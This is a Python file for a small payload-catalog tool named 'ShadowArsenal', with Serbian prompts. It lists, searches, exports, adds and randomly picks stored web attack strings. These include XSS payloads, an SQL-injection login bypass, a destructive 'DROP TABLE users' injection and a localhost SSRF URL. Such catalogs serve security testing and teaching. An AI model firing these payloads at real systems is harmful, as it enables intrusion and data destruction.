import json

PAYLOADS = [
    {
        "category": "XSS",
        "payload": "<script>alert(1)</script>",
        "description": "Basic reflected XSS test",
        "tags": ["reflected", "basic"]
    },
    {
        "category": "XSS",
        "payload": "\"><img src=x onerror=alert(1)>",
        "description": "HTML attribute injection XSS",
        "tags": ["html", "img", "onerror"]
    },
    {
        "category": "SQLi",
        "payload": "' OR 1=1--",
        "description": "Classic SQL Injection bypass",
        "tags": ["sqli", "auth-bypass"]
    },
    {
        "category": "SQLi",
        "payload": "'; DROP TABLE users--",
        "description": "Destructive SQL payload",
        "tags": ["sqli", "destructive"]
    },
    {
        "category": "SSRF",
        "payload": "http://127.0.0.1:80",
        "description": "Localhost SSRF test",
        "tags": ["ssrf", "localhost"]
    }
]

def show_payloads(category_filter=None):
    print("\n[+] ShadowArsenal Payloads:\n")
    for p in PAYLOADS:
        if category_filter and p["category"].lower() != category_filter.lower():
            continue
        print(f"- {p['category']} | {p['payload']}")
        print(f"  → {p['description']} (tags: {', '.join(p['tags'])})\n")

def search_payloads(term):
    print(f"\n[?] Rezultati za: '{term}'\n")
    for p in PAYLOADS:
        if term.lower() in p["payload"].lower() or term.lower() in p["description"].lower() or term.lower() in " ".join(p["tags"]).lower():
            print(f"- {p['category']} | {p['payload']}")
            print(f"  → {p['description']} (tags: {', '.join(p['tags'])})\n")

def export_payloads(filename="arsenal_export.json"):
    with open(filename, "w") as f:
        json.dump(PAYLOADS, f, indent=2)
    print(f"[✓] Arsenal eksportovan u {filename}")
def add_payload():
    print("\n[+] Dodavanje novog payload-a u ShadowArsenal")
    category = input("Kategorija (XSS, SQLi, SSRF...): ").strip()
    payload = input("Payload string: ").strip()
    description = input("Kratak opis: ").strip()
    tags = input("Tagovi (odvojeni zarezima): ").strip().split(",")

    entry = {
        "category": category,
        "payload": payload,
        "description": description,
        "tags": [t.strip() for t in tags]
    }

    PAYLOADS.append(entry)
    print("[✓] Payload dodat u memoriju (još nije snimljen)")
import random

def random_payload(category_filter=None):
    candidates = [p for p in PAYLOADS if not category_filter or p["category"].lower() == category_filter.lower()]
    
    if not candidates:
        print("[x] Nema payload-a u toj kategoriji.")
        return

    choice = random.choice(candidates)
    print(f"\n[+] Nasumičan payload iz arsenala:\n")
    print(f"Category : {choice['category']}")
    print(f"Payload  : {choice['payload']}")
    print(f"Desc     : {choice['description']}")
    print(f"Tags     : {', '.join(choice['tags'])}")
